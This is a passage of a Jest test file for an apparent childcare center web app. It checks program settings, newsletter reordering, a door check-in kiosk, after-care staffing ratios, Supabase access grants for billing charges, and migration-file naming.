            if (roomIds.includes(id)) throw new Error(`${id} is a room; it must not be`);
        });
        // And the program list really does declare them.
        ['before_care', 'after_care', 'camp']
            .forEach(id => expect(progIds.includes(id)).toBe(true));
        // ⚠️ There is no weekly after-care rate. Andrew: "no weekly
        // aftercare rate." It was invented, and a price a parent can plan
        // around but not actually buy is worse than no price at all.
        expect(progIds.includes('after_care_weekly')).toBe(false);
    });

    // After care's ratio has exactly one definition. A literal here is the
    // bug: the staffing grid and the attendance board read
    // PM_COMBINED_RATIO, and a second editable copy lets them disagree.
    test('after care derives its ratio from PM_COMBINED_RATIO, never a literal', () => {
        // Sliced to the NEXT program, whatever it is — keying the end of
        // this block on a specific sibling meant deleting that sibling made
        // the slice empty and the assertions meaningless rather than failing.
        const block = sb.slice(sb.indexOf("id:        'after_care',"), sb.indexOf("id:        'camp'"));
        expect(/ratio:\s*PM_COMBINED_RATIO/.test(block)).toBe(true);
        expect(/ratio:\s*\d/.test(block)).toBe(false);
        expect(/pooledRooms:\s*PM_COMBINED_ROOM_IDS/.test(block)).toBe(true);

        // The Settings screen shows it rather than editing it, and force-sets
        // it back on save so a hand-edited DOM cannot persist a second value.
        const admin = read('js/admin/admin-programs.js');
        expect(/ac\.ratio\s*=\s*PM_COMBINED_RATIO/.test(admin)).toBe(true);
    });

    // ⚠️ <input type="time"> accepts ONLY zero-padded HH:MM. Given '7:30' the
    // browser renders an EMPTY box with no error, and the next Save writes
    // null over real hours. That shipped: Before care's 7:30–9:00 showed
    // blank on the settings screen while After care's 15:00 was fine.
    test('every program hour is zero-padded, and the input normalizes anyway', () => {
        const block = sb.slice(sb.indexOf('const PROGRAMS = ['), sb.indexOf('const PROGRAM_FEES'));
        const times = [...block.matchAll(/(?:startTime|endTime):\s*'([^']*)'/g)].map(m => m[1]);
        expect(times.length > 0).toBe(true);
        times.forEach(t => expect(`${t} is HH:MM: ${/^\d{2}:\d{2}$/.test(t)}`).toBe(`${t} is HH:MM: true`));

        // And the render normalizes, because the settings document is
        // admin-editable and may already hold an unpadded value. Losing a
        // program's hours to a silent format mismatch is the worse failure.
        const admin = read('js/admin/admin-programs.js');
        expect(/function _pgTimeValue/.test(admin)).toBe(true);
        expect(/value="\$\{escHtml\(_pgTimeValue\(p\.startTime\)\)\}"/.test(admin)).toBe(true);
        expect(/value="\$\{escHtml\(_pgTimeValue\(p\.endTime\)\)\}"/.test(admin)).toBe(true);
    });

    // Programs are config, not a table — the whole reason this needs no
    // migration. If someone reaches for a new table, this fails.
    test('programs live in the settings key/value document, not a new table', () => {
        expect(/upsert\(\{\s*key:\s*'programs'/.test(sb)).toBe(true);
        expect(/from\('programs'\)/.test(sb)).toBe(false);
        expect(/from\('program_enrollments'\)/.test(sb)).toBe(false);
    });

    // Neither surface may quote a price of its own — the office sets rates
    // in one place and both screens read it.
    test('neither the Settings table nor the parent card hardcodes a rate', () => {
        const parent = read('js/parent/parent-programs.js');
        const admin  = read('js/admin/admin-programs.js');
        [['parent card', parent], ['settings table', admin]].forEach(([name, src]) => {
            const code = src.replace(/\/\*[\s\S]*?\*\//g, '')
                .split('\n').filter(l => !/^\s*\/\//.test(l)).join('\n');
            // No dollar literal anywhere in the rendering code.
            if (/\$\d/.test(code)) throw new Error(`${name} contains a hardcoded price`);
            expect(/loadProgramSettings/.test(code)).toBe(true);
        });
    });

    // Booking is not wired; the parent card must say so rather than render a
    // dead submit, the same rule the drop-in card follows.
    test('the parent card writes nothing and says booking is not open', () => {
        const parent = read('js/parent/parent-programs.js');
        expect(/sbClient\s*\.\s*from\(/.test(parent)).toBe(false);
        expect(parent.includes("isn't switched on yet")).toBe(true);
    });
});


// ============================================================
// NEWSLETTER — live blocks and drag reordering
// (design handoff: Capacity & Fill, 4e)
// ============================================================
describe('Newsletter — what it stores and how blocks move', () => {
    const repoRoot = path.resolve(__dirname, '..', '..');
    const src = fs.readFileSync(path.join(repoRoot, 'js/admin/admin-newsletter.js'), 'utf8');

    // The whole value of the feature: a live block stores its TYPE, never
    // its rendered text. Freezing the text at drag time is the bug — a
    // closure changed the day before sending would reach families wrong.
    test('a live block stores only its type, never resolved text', () => {
        const drop = src.slice(src.indexOf("if (_nlDrag.kind === 'new')"));
        const splice = /blocks\.splice\(index, 0, \{([^}]*)\}\)/.exec(drop);
        if (!splice) throw new Error('could not find the insert');
        const fields = splice[1];
        expect(/type:\s*_nlDrag\.type/.test(fields)).toBe(true);
        // text is an empty string for the typed blocks; nothing resolved.
        expect(/closures|menu|regWindow|openDays/.test(fields)).toBe(false);
    });

    // Reordering with splice is the classic off-by-one: removing the block
    // first shifts every later index down by one. This is that fix, tested
    // as a pure reimplementation of the same three lines.
    test('moving a block down accounts for its own removal', () => {
        function move(list, id, index) {
            const blocks = list.slice();
            const from = blocks.findIndex(b => b.id === id);
            if (from < 0) return blocks;
            if (from < index) index--;
            const [moved] = blocks.splice(from, 1);
            blocks.splice(index, 0, moved);
            return blocks;
        }
        const ids = l => l.map(b => b.id).join('');
        const L = ['a', 'b', 'c', 'd'].map(id => ({ id }));

        // Drop 'a' into the gap after 'c' (index 3) → b c a d
        expect(ids(move(L, 'a', 3))).toBe('bcad');
        // Drop 'd' into the gap before 'b' (index 1) → a d b c
        expect(ids(move(L, 'd', 1))).toBe('adbc');
        // Dropping into its own gap is a no-op, both sides.
        expect(ids(move(L, 'b', 1))).toBe('abcd');
        expect(ids(move(L, 'b', 2))).toBe('abcd');
        // The ends.
        expect(ids(move(L, 'a', 0))).toBe('abcd');
        expect(ids(move(L, 'a', 4))).toBe('bcda');
        expect(ids(move(L, 'd', 0))).toBe('dabc');
        // Every move keeps all four blocks.
        [0, 1, 2, 3, 4].forEach(i => ['a', 'b', 'c', 'd'].forEach(id => {
            expect(move(L, id, i).length).toBe(4);
        }));
    });

    // Open days in the letter must use the same rule the director's screen
    // does, or the newsletter advertises a seat the app would refuse.
    test('the open-days block applies the at-ratio rule', () => {
        const block = src.slice(src.indexOf('out.openDays = rooms.map'));
        expect(/booked\s*%\s*ratio\s*===\s*0/.test(block)).toBe(true);
        expect(/booked\s*>\s*0/.test(block)).toBe(true);
        expect(/!atRatio/.test(block)).toBe(true);
    });

    // Sending is not built, and must not be faked. The module may write the
    // draft setting and nothing else.
    test('the newsletter saves a draft and sends nothing', () => {
        const code = src.replace(/\/\*[\s\S]*?\*\//g, '')
            .split('\n').filter(l => !/^\s*\/\//.test(l)).join('\n');
        expect(/upsertSetting\('newsletter_draft'/.test(code)).toBe(true);
        // No mail path and no bulk insert. Matched as CALLS, not as loose
        // substrings — "send-" alone also matches the class name on the
        // panel that EXPLAINS there is no send, which is the opposite of
        // what this is checking for.
        expect(/functions\s*\.\s*invoke\s*\(/.test(code)).toBe(false);
        expect(/\bsend[A-Z]\w*\s*\(/.test(code)).toBe(false);
        expect(/functions\/v1\/send-/.test(code)).toBe(false);
        expect(/\.\s*insert\s*\(/.test(code)).toBe(false);
        expect(src.includes("send button isn't built")).toBe(true);
    });
});


// ============================================================
// THE DOOR — kiosk and the signature record
// (design handoff: Capacity & Fill, 4a · 4b · 5b · 5d)
// ============================================================
// These two are the halves of one licensing artifact, and both are honest
// about a gap rather than filling it. The tests protect the honesty: a
// signature stored anywhere but a real record is worse than paper, because
// it looks like a system of record and is not.
describe('The door — kiosk and the signature record', () => {
    const vm = require('vm');
    const repoRoot = path.resolve(__dirname, '..', '..');
    const read = rel => fs.readFileSync(path.join(repoRoot, rel), 'utf8');
    const kiosk = read('js/kiosk.js');
    const rec   = read('js/admin/admin-signature-record.js');
    const code = src => src.replace(/\/\*[\s\S]*?\*\//g, '')
        .split('\n').filter(l => !/^\s*\/\//.test(l)).join('\n');

    // The kiosk never decides whether a PIN is right, and never keeps one.
    test('the kiosk authenticates server-side and holds no credential', () => {
        const c = code(kiosk);
        expect(/familyLogin\(/.test(c)).toBe(true);
        // No local PIN comparison, no hashing, no storage of any kind.
        expect(/localStorage|sessionStorage|indexedDB/i.test(c)).toBe(false);
        // The PIN is dropped on reset.
        expect(/kPin\s*=\s*null/.test(c)).toBe(true);
    });

    // A signature in localStorage would look like a record and not be one.
    test('the kiosk stores no signature and writes no attendance', () => {
        const c = code(kiosk);
        expect(/toDataURL/.test(c)).toBe(false);
        expect(/\.\s*insert\s*\(/.test(c)).toBe(false);
        expect(/log_child_event|admin_log_child_event/.test(c)).toBe(false);
        expect(kiosk.includes("can't be saved yet")).toBe(true);
    });

    // A shared tablet must not hold a family's session after they leave.
    test('the kiosk resets itself after an idle period', () => {
        expect(/KIOSK_IDLE_MS/.test(kiosk)).toBe(true);
        expect(/setTimeout\(kReset/.test(kiosk)).toBe(true);
    });

    // first check_in / last check_out, from events ordered ascending.
    test('the record takes the first arrival and the last departure', () => {
        const sandbox = {
            console, escHtml: s => String(s),
            getSortedRooms: () => [{ id: 'goose', label: 'Goose' }],
            document: { getElementById: () => null },
        };
        vm.createContext(sandbox);
        vm.runInContext(rec, sandbox);

        const board = { children: [
            { student_id: 'a', child_name: 'Ada', room_id: 'goose', attendance_status: 'left' },
            { student_id: 'b', child_name: 'Bo',  room_id: 'goose', attendance_status: 'present' },
            { student_id: 'c', child_name: 'Cy',  room_id: 'goose', attendance_status: 'not_arrived' },
        ] };
        // Ada came, went, came back, went again. Bo is still here.
        const events = [
            { student_id: 'a', event_type: 'check_in',  occurred_at: '2026-09-15T08:05:00Z' },
            { student_id: 'b', event_type: 'check_in',  occurred_at: '2026-09-15T08:40:00Z' },
            { student_id: 'a', event_type: 'check_out', occurred_at: '2026-09-15T12:00:00Z' },
            { student_id: 'a', event_type: 'check_in',  occurred_at: '2026-09-15T13:00:00Z' },
            { student_id: 'a', event_type: 'check_out', occurred_at: '2026-09-15T17:10:00Z' },
        ];
        const rows = sandbox._srRows(board, events);
        const ada = rows.find(r => r.name === 'Ada');
        const bo  = rows.find(r => r.name === 'Bo');
        const cy  = rows.find(r => r.name === 'Cy');

        // FIRST in, not the later one; LAST out, not the earlier one.
        // Compared against the same formatter rather than a literal clock
        // time, so the assertion means "it picked THAT event" regardless of
        // the machine's timezone.
        const fmt = iso => sandbox._srTime(iso);
        expect(ada.inAt).toBe(fmt('2026-09-15T08:05:00Z'));    // the 8:05 in
        expect(ada.inAt === fmt('2026-09-15T13:00:00Z')).toBe(false);  // not the 13:00 one
        expect(ada.outAt).toBe(fmt('2026-09-15T17:10:00Z'));   // the 17:10 out
        expect(ada.outAt === fmt('2026-09-15T12:00:00Z')).toBe(false); // not the 12:00 one
        // Bo has an in and no out; Cy has neither.
        expect(bo.outAt).toBeNull();
        expect(cy.inAt).toBeNull();
        expect(cy.outAt).toBeNull();
    });

    // Zero signatures is the true figure, not a placeholder to be tidied
    // away. If the column ever fills, this test is the reminder to update
    // the copy along with it.
    test('the record reports the signature gap rather than hiding it', () => {
        expect(rec.includes('no signature')).toBe(true);
        expect(/With a signature/.test(rec)).toBe(true);
        // It writes nothing at all.
        expect(/\.\s*insert\s*\(|\.\s*update\s*\(|\.\s*upsert\s*\(/.test(code(rec))).toBe(false);
    });
});


// ============================================================
// BEFORE & AFTER CARE — the pooled afternoon floor
// (design handoff: Capacity & Fill, 5a)
// ============================================================
// The afternoon group is the one part of turn 5 with real data behind it:
// Goose, Turtle and Owl combine from 1:00p, so a FULL-DAY booking in one of
// those rooms is a child on that floor. The rule has to match apStaffing()'s
// pooled After Care row exactly, or the director's staffing grid and this
// screen disagree about the same afternoon.
describe('Before & After Care — the combined afternoon', () => {
    const vm = require('vm');
    const repoRoot = path.resolve(__dirname, '..', '..');
    const src = fs.readFileSync(path.join(repoRoot, 'js/admin/admin-before-after-care.js'), 'utf8');

    const DATE = '2026-09-15';
    function load({ registrations = [], closures = [], capacity = 20 } = {}) {
        const sandbox = {
            console, escHtml: s => String(s),
            PM_COMBINED_ROOM_IDS: ['goose', 'turtle', 'owl'],
            PM_COMBINED_RATIO: 8,
            ROOMS: [
                { id: 'goose',  label: 'Goose' }, { id: 'turtle', label: 'Turtle' },
                { id: 'owl',    label: 'Owl' },   { id: 'bee',    label: 'Bee' },
            ],
            allRegistrations: registrations,
            allClosureDates: new Set(closures),
            document: { getElementById: () => null },
        };
        vm.createContext(sandbox);
        vm.runInContext(src, sandbox);
        // ⚠️ The module's `_bacPrograms` is a top-level `let`, which in a vm
        // script is a LEXICAL binding — it never becomes a property of the
        // context, so assigning sandbox._bacPrograms would be ignored.
        // `_bacProgram()` is a function declaration and IS on the context,
        // so overriding the lookup is what actually injects a program.
        sandbox._bacProgram = (id) => (id === 'after_care'
            ? { id, label: 'After care', capacity, ratio: 8, rate: 12,
                startTime: '15:00', endTime: '17:00' }
            : null);
        return sandbox;
    }

    const reg = (room, n, dayType = 'full') => ({
        room_id: room,
        registration_dates: Array.from({ length: n }, (_, i) => ({
            care_date: DATE, waitlisted: false, day_type: dayType,
        })),
        child_name: `Child ${room}`,
    });

    // The rule that matters: half days have gone home before the rooms
    // combine, and a room outside the pool is not on this floor at all.
    test('only full-day children in the three combining rooms are on the floor', () => {
        const m = load({ registrations: [
            reg('goose', 3),                 // on the floor
            reg('turtle', 2),                // on the floor
            reg('owl', 1, 'half'),           // gone by 1:00p
            reg('bee', 5),                   // not one of the three
        ] });
        const f = m._bacAfternoonFloor(DATE);
        expect(f.present).toBe(5);
    });

    // Adults needed must be ceil(present / PM_COMBINED_RATIO) — the same
    // expression apStaffing's pooled row uses.
    test('adults needed matches the pooled ratio, and headroom names the next child', () => {
        const at = n => load({ registrations: [reg('goose', n)] })._bacAfternoonFloor(DATE);

        expect(at(8).adults).toBe(1);
        expect(at(8).beforeNextAdult).toBe(0);      // the 9th costs an adult
        expect(at(9).adults).toBe(2);
        expect(at(9).beforeNextAdult).toBe(7);
        expect(at(0).adults).toBe(0);               // nobody is not a boundary

        for (let n = 1; n <= 24; n++) expect(at(n).adults).toBe(Math.ceil(n / 8));
    });

    // ⚠️ This used to assert a seat count. Andrew: "the pre-k before care and
    // after care is not a room, just a charge that is applied if a child
    // attends." A seat implies a reservation, and none is ever made — so the
    // screen must expose no capacity at all, and staffing must still be
    // right past any number a capacity would have named.
    test('there is no seat count, because nobody reserves a place', () => {
        const m = load({ registrations: [reg('goose', 12), reg('turtle', 11)], capacity: 20 });
        const f = m._bacAfternoonFloor(DATE);
        expect(f.present).toBe(23);
        expect('seatsLeft' in f).toBe(false);
        expect('capacity' in f).toBe(false);
        // Past 20 the ratio keeps working, which is the point: what limits
        // the floor is adults, not a cap.
        expect(f.adults).toBe(3);                   // ceil(23 / 8)
        expect(f.beforeNextAdult).toBe(1);
    });

    // A capacity saved back when this WAS modelled as a room would survive
    // the merge in loadProgramSettings() and read like a real limit on a
    // screen with no way to enforce one. Both the load and the save drop it.
    test('a stale saved capacity does not survive into a daily program', () => {
        const sb = fs.readFileSync(path.join(repoRoot, 'js/supabase.js'), 'utf8');
        const load = sb.slice(sb.indexOf('async function loadProgramSettings()'));
        const body = load.slice(0, load.indexOf('\n}\n'));
        expect(/kind !== 'camp'[\s\S]{0,80}delete merged\.capacity/.test(body)).toBe(true);

        const pg = fs.readFileSync(path.join(repoRoot, 'js/admin/admin-programs.js'), 'utf8');
        expect(/kind !== 'camp'[\s\S]{0,40}delete p\.capacity/.test(pg)).toBe(true);
        // And the settings table offers no box to type one into.
        const cell = pg.slice(pg.indexOf('function _pgCapacityCell'));
        expect(/kind !== 'camp'/.test(cell.slice(0, cell.indexOf('\n}')))).toBe(true);
    });

    test('the settings document gives a daily program no capacity to read', () => {
        const sb = fs.readFileSync(path.join(repoRoot, 'js/supabase.js'), 'utf8');
        const block = sb.slice(sb.indexOf('const PROGRAMS = ['));
        const programs = block.slice(0, block.indexOf('\n];'));
        // Split on the id lines so each program's own fields are checked.
        const chunks = programs.split(/\n\s{4}\{/).filter(c => c.includes('id:'));
        for (const c of chunks) {
            const id = /id:\s*'([^']+)'/.exec(c)[1];
            const hasCapacity = /\n\s*capacity:/.test(c);
            // Camp is booked ahead for a specific week and genuinely fills.
            expect(`${id}:${hasCapacity}`).toBe(`${id}:${id === 'camp'}`);
        }
    });

    test('a closed day has no floor at all', () => {
        const m = load({ registrations: [reg('goose', 6)], closures: [DATE] });
        const f = m._bacAfternoonFloor(DATE);
        expect(f.closed).toBe(true);
        expect(f.present).toBe(0);
    });

    // Nothing records the attendance yet, so the screen must not pretend
    // otherwise or quietly query something that is not there.
    // The table is live now, but this screen still reads nothing from it and
    // writes nothing: the door RPC is the only writer, and no reader is
    // wired yet. The screen has to say that rather than imply a roster.
    test('the screen queries no charge table and says nothing is recorded', () => {
        const code = src.replace(/\/\*[\s\S]*?\*\//g, '')
            .split('\n').filter(l => !/^\s*\/\//.test(l)).join('\n');
        expect(/from\(\s*['"`](care_charges|program_)/.test(code)).toBe(false);
        expect(/\.\s*insert\s*\(|\.\s*upsert\s*\(/.test(code)).toBe(false);
        expect(src.includes('It is empty because nobody has been checked in yet')).toBe(true);
    });

    // The screen must say what the thing IS, in Andrew's terms, so the next
    // person to open it does not rebuild the room model from the UI.
    test('the screen calls it a charge, not an enrolment or a seat', () => {
        expect(/not a room/i.test(src)).toBe(true);
        // The quote is wrapped across comment lines, so collapse the file to
        // one line of words before looking for it — otherwise this passes or
        // fails on where the line break landed.
        const flat = src.replace(/\/\//g, ' ').replace(/\s+/g, ' ');
        expect(flat.includes('just a charge that is applied if a child attends')).toBe(true);
        expect(/A child attends, and a charge follows/.test(src)).toBe(true);
        // No leftover room vocabulary in anything the director reads.
        const ui = src.split('\n').filter(l => !/^\s*(\/\/|\*)/.test(l)).join('\n');
        expect(/Seats left|spots left|Walk-in headroom|Room for \$\{/i.test(ui)).toBe(false);
        expect(/enrolment in a <em>program<\/em>/i.test(ui)).toBe(false);
    });

    // The proposal must stay a proposal: no version prefix, loudly marked,
    // and no anon policy over a table that names children and sets a price.
    test('the applied migration opens no anon door', () => {
        const mig = readMigration('before_after_care_charges');
        // Applied 2026-09-15. The file is named for the version the database
        // assigned, and says so — never a hand-picked timestamp.
        expect(/APPLIED 2026-09-15 as version 20260915171800/.test(mig)).toBe(true);
        expect(/PROPOSED|NOT APPLIED/.test(mig.split('\n')[1] || '')).toBe(false);
        // Policies name `authenticated`, never `public`/`anon`. Checked
        // against the DDL with comments stripped — the file EXPLAINS why
        // `TO public` is wrong, and a naive search matches that sentence.
        const ddl = mig.split('\n').filter(l => !/^\s*--/.test(l)).join('\n');
        expect(/TO\s+authenticated/.test(ddl)).toBe(true);
        expect(/CREATE POLICY[^;]*anon/i.test(ddl)).toBe(false);
        // ⚠️ This used to assert that the word `anon` appeared nowhere at
        // all. It cannot any more: the door kiosk holds no session, so anon
        // is what calls record_door_checkin. Blunt is no longer safe, so be
        // exact — anon may reach that ONE function and nothing else. A
        // table grant or a policy would bypass the PIN check entirely.
        const anonGrants = (ddl.match(/GRANT[^;]*?\banon\b[^;]*;/gi) || []);
        expect(anonGrants.length).toBe(1);
        expect(/EXECUTE ON FUNCTION public\.record_door_checkin/.test(anonGrants[0])).toBe(true);
        expect(/GRANT[^;]*ON TABLE[^;]*\banon\b/i.test(ddl)).toBe(false);
        expect(/GRANT[^;]*\bcare_charges\b[^;]*\banon\b/i.test(ddl)).toBe(false);
        expect(/TO\s+public\b/i.test(ddl)).toBe(false);
        // One table, and it is a charge. The enrolment table is gone, not
        // renamed — a second table would be the room model wearing a hat.
        expect((ddl.match(/CREATE TABLE/g) || []).length).toBe(1);
        expect(/program_enrolments/.test(mig)).toBe(true);   // explains what it replaced
        expect(/CREATE TABLE[^;]*program_enrolments/.test(ddl)).toBe(false);
        // The rate is frozen into the row, and a waiver has to say why.
        expect(/rate_charged/.test(ddl)).toBe(true);
        expect(/waived_reason IS NOT NULL/.test(ddl)).toBe(true);
        // And nothing shipped DEPENDS on it.
        const code = src.replace(/\/\*[\s\S]*?\*\//g, '')
            .split('\n').filter(l => !/^\s*\/\//.test(l)).join('\n');
        expect(/from\(\s*['"`]care_charges/.test(code)).toBe(false);
    });

    // Andrew: "bill each family directly, not the pre-k organization."
    //
    // The trap this closes: `students.family_id` is NULLABLE, so a charge
    // that reached the family only by joining through `students` could be
    // owed by nobody — never on an invoice, never in a balance, and never an
    // error. Just a row. So the charge carries its own family_id, NOT NULL.
    test('every charge names the family it bills, and cannot exist without one', () => {
        const mig = readMigration('before_after_care_charges');
        const ddl = mig.split('\n').filter(l => !/^\s*--/.test(l)).join('\n');

        expect(/family_id\s+uuid\s+NOT NULL REFERENCES public\.families\(id\)/.test(ddl)).toBe(true);
        // RESTRICT, not CASCADE: deleting a family must not silently erase
        // what it was charged.
        expect(/REFERENCES public\.families\(id\) ON DELETE RESTRICT/.test(ddl)).toBe(true);
        expect(/REFERENCES public\.families\(id\) ON DELETE CASCADE/.test(ddl)).toBe(false);

        // No organization payer, no consolidated Pre-K invoice, no second
        // billing mode — the answer removes a column rather than adding one.
        expect(/bill_to/.test(ddl)).toBe(false);
        expect(/'organization'/.test(ddl)).toBe(false);
        // The decision is written down where the next reader will find it.
        expect(/bill each family directly, not the pre-k organization/i.test(mig)).toBe(true);

        // And the screen says so too, rather than leaving it open.
        expect(/Every family is billed directly/.test(src)).toBe(true);
    });
});

// ============================================================
// THE DOOR KIOSK — an unauthenticated tablet writing billing rows
// ============================================================
// Andrew: "the kiosk creates a provisional family record at the door."
//
// This is the sharpest thing in the proposal. A wall tablet in a hallway,
// signed in as nobody, creates a row that billing, statements, balances and
// payments all read. These assertions are the boundary around that hole.
describe('The door kiosk creates a provisional family', () => {
    const fs = require('fs');
    const path = require('path');
    const repoRoot = path.resolve(__dirname, '..', '..');
    const src = fs.readFileSync(path.join(repoRoot,
        'js/admin/admin-before-after-care.js'), 'utf8');
    const mig = readMigration('before_after_care_charges');
    const ddl = mig.split('\n').filter(l => !/^\s*--/.test(l)).join('\n');

    // ⚠️ The RPC is asserted against the CORRECTING migration, not the one
    // that created the table. The original shipped a call to
    // staff_id_for_pin(p_pin) — a signature production has not had in
    // months — which compiled fine and failed on the first real call. That
    // broken text is still in the applied file, left as it ran, so a test
    // reading THAT file would happily lock the bug in. Read what is live.
    const fix = readMigration('record_door_checkin_fix_staff_pin_signature');
    const fixDdl = fix.split('\n').filter(l => !/^\s*--/.test(l)).join('\n');
    const rpc = fixDdl.slice(fixDdl.indexOf('FUNCTION public.record_door_checkin'));

    test('anon reaches exactly one function, and that function checks a staff PIN', () => {
        // The kiosk holds no session, so `anon` is the real caller. It may
        // call this and nothing else — and the function itself is the gate,
        // not a policy, because a policy cannot verify a PIN.
        expect(/GRANT EXECUTE ON FUNCTION public\.record_door_checkin\(uuid, integer[\s\S]{0,140}TO anon/.test(fixDdl)).toBe(true);
        // Name THEN pin — a PIN alone was guessable across the whole roster,
        // which is why staff_signin_name_then_pin replaced the one-arg form.
        expect(/staff_id_for_pin\(p_staff_id, p_pin\)/.test(rpc)).toBe(true);
        expect(/staff_id_for_pin\(p_pin\)/.test(rpc)).toBe(false);
        // And the dead one-argument overload is dropped, not left beside it.
        expect(/DROP FUNCTION IF EXISTS public\.record_door_checkin\(integer,/.test(fixDdl)).toBe(true);
        expect(/SECURITY DEFINER/.test(rpc)).toBe(true);
        // A bad PIN returns; it does not fall through to the writes below.
        expect(/v_staff_id IS NULL THEN[\s\S]{0,90}bad_pin/.test(rpc)).toBe(true);
        // And no table is opened to anon anywhere in the file.
        expect(/GRANT[^;]*ON TABLE[^;]*anon/i.test(ddl)).toBe(false);
        expect(/CREATE POLICY[^;]*TO\s+anon/i.test(ddl)).toBe(false);
        // ⚠️ Not granting is not enough. Supabase's ALTER DEFAULT PRIVILEGES
        // handed this table INSERT/SELECT/UPDATE/DELETE to anon the moment it
        // was created — invisible in the creating migration, masked by RLS,
        // and live the instant anyone adds a permissive policy. Caught by
        // running VERIFY_door_checkin_boundary.sql straight after applying.
        const strip = readMigration('care_charges_strip_default_grants');
        expect(/REVOKE ALL ON TABLE public\.care_charges FROM anon/.test(strip)).toBe(true);
        expect(/REVOKE ALL ON SEQUENCE public\.care_charges_id_seq FROM anon/.test(strip)).toBe(true);
    });

    test('a door record is unfinished, cannot multiply, and cannot run forever', () => {
        // Visibly provisional, so it is never mistaken for a real family
        // that merely happens to have no email address.
        expect(/provisional_at\s+timestamptz/.test(ddl)).toBe(true);
        // One live provisional family per phone: the same walk-in on Tuesday
        // joins Monday's record instead of splitting the month across two
        // invoices, neither of which would be right.
        expect(/UNIQUE INDEX[\s\S]{0,220}families_provisional_one_per_phone/.test(ddl)).toBe(true);
        // A hard cap, counted across ALL of that family's charges — not per
        // program and not per month, either of which would reset its way
        // into being permanent.
        expect(/PROVISIONAL_MAX_SESSIONS/.test(rpc)).toBe(true);
        expect(/count\(\*\) INTO v_used FROM care_charges WHERE family_id/.test(rpc)).toBe(true);
        expect(/needs_office/.test(rpc)).toBe(true);
    });

    test('the two defaults that would harm the child are overridden', () => {
        // ⚠️ SAFETY, not billing. students.allergies defaults to '[]', which
        // reads exactly like "reviewed, no allergies" — a claim nobody made
        // about a child whose parent has just walked out. And photo_release
        // defaults to TRUE, a consent nobody gave.
        expect(/INSERT INTO students \(family_id, child_name, photo_release\)/.test(rpc)).toBe(true);
        expect(/VALUES \(v_family_id, btrim\(p_child_name\), false\)/.test(rpc)).toBe(true);
        // allergies_reviewed_at is never stamped here, so every existing
        // allergy surface keeps treating this child as unreviewed.
        expect(/allergies_reviewed_at/.test(rpc)).toBe(false);
    });

    test('a repeated tap does not bill the family twice', () => {
        // A teacher with a child on one hip taps the tile again. The unique
        // constraint is the guard, and the repeat is a no-op rather than an
        // error the kiosk would have to explain to someone holding a bag.
        expect(/ON CONFLICT \(student_id, program_id, care_date\) DO NOTHING/.test(rpc)).toBe(true);
    });

    test('the rate is read once at the door and frozen onto the charge', () => {
        expect(/INTO v_rate[\s\S]{0,220}FROM settings/.test(rpc)).toBe(true);
        expect(/rate_charged, recorded_by\)[\s\S]{0,200}v_rate/.test(rpc)).toBe(true);
    });

    test('a walk-in is not charged a joining fee by accident', () => {
        // Checked against the live gate rather than assumed: the new-family
        // fee needs a CONFIRMED REGISTRATION to establish a first care
        // month, and a provisional family has none.
        const gate = readMigration('annual_fee_single_month_gate');
        expect(/not f\.new_family_fee_charged/.test(gate)).toBe(true);
        expect(/from registrations r2/.test(gate)).toBe(true);
        expect(/r2\.status = 'confirmed'/.test(gate)).toBe(true);
        expect(/new-family fee cannot/.test(mig)).toBe(true);   // and the file says so
    });

    test('there is a written, read-only way to check the boundary held', () => {
        const v = fs.readFileSync(path.join(repoRoot,
            'supabase/migrations/VERIFY_door_checkin_boundary.sql'), 'utf8');
        // A VERIFY file that mutates would be a migration in disguise, and
        // nothing prefixed VERIFY_ gets reviewed as one.
        const stmts = v.split('\n').filter(l => !/^\s*--/.test(l)).join('\n');
        expect(/^\s*(INSERT|UPDATE|DELETE|DROP|ALTER|CREATE|TRUNCATE|GRANT|REVOKE)\b/im.test(stmts)).toBe(false);
        // It checks the things that actually hurt: anon's reach, children
        // whose allergies nobody asked about, and uncollectable charges.
        expect(/grantee = 'anon'/.test(v)).toBe(true);
        expect(/allergies_reviewed_at IS NULL/.test(v)).toBe(true);
        expect(/parent_email/.test(v)).toBe(true);
    });

    test('the screen tells the director what a door record is', () => {
        expect(/provisional family from a staff PIN/.test(src)).toBe(true);
        expect(/allergies are <em>unknown<\/em>/.test(src)).toBe(true);
    });
});


// ============================================================
// MIGRATION LEDGER HYGIENE
// ============================================================
// The drift that broke the Supabase Preview check on every commit to main
// was invisible for months because nothing in the repo could see it: the
// filenames said one version, the database had recorded another, and no test
// compared the two. These assertions are that comparison.
describe('Migration ledger hygiene', () => {
    const fsx = require('fs');
    const pathx = require('path');
    const repoRoot = pathx.resolve(__dirname, '..', '..');
    const MIG = pathx.join(repoRoot, 'supabase', 'migrations');
    const { checkMigrations } = require('../../scripts/check-migrations.js');

    test('every applied version has a file, and every file was applied', () => {
        const problems = checkMigrations();
        // The message matters more than the count — a failure here should say
        // which version drifted, not just that something did.
        expect(problems.join('\n') || 'clean').toBe('clean');
    });

    test('the check actually fails when a version drifts', () => {
        // A guard nobody has watched fail is a guard you are trusting on
        // faith. Move one real file to a version production never applied and
        // confirm the checker notices, then put it back.
        const real = fsx.readdirSync(MIG).find(f => /^\d{14}_/.test(f));
        const moved = pathx.join(MIG, '29991231235959_drift_canary.sql');
        fsx.renameSync(pathx.join(MIG, real), moved);
        try {
            const problems = checkMigrations();
            expect(problems.some(p => p.includes('29991231235959'))).toBe(true);
            expect(problems.some(p => p.includes(real.slice(0, 14)))).toBe(true);
        } finally {
            fsx.renameSync(moved, pathx.join(MIG, real));
        }
        expect(checkMigrations().length).toBe(0);
    });

    test('nothing that must not run carries a version prefix', () => {
        // A version prefix is what makes `supabase db push` try to execute a
        // file. Proposals, rollbacks and verification queries must never have
        // one — a PROPOSED_ migration that gained a timestamp would apply
        // unreviewed schema to a live childcare database.
        //
        // HISTORICAL_ is exempt: three of those files carry the timestamp
        // they were written with in June, before the ledger existed
        // (HISTORICAL_20260603_add_room_id_to_clock_events.sql). Keeping it is
        // useful — it dates the file — and the leading word is what disarms
        // it, because the CLI only recognizes a version at the very start of
        // the name.
        for (const f of fsx.readdirSync(MIG)) {
            if (!f.endsWith('.sql')) continue;
            if (!/^(PROPOSED|ROLLBACK|VERIFY)_/.test(f)) continue;
            expect(`${f}: ${/^\w+?_\d{8,14}_/.test(f)}`).toBe(`${f}: false`);
        }
        // Whatever the prefix, no file may begin with a bare version unless
        // that version is one production actually applied — which is the
        // first assertion in this block.
        for (const f of fsx.readdirSync(MIG)) {
            if (!f.endsWith('.sql')) continue;
            expect(`${f}: ${/^(PROPOSED|ROLLBACK|VERIFY|HISTORICAL)_|^\d{14}_/.test(f)}`)
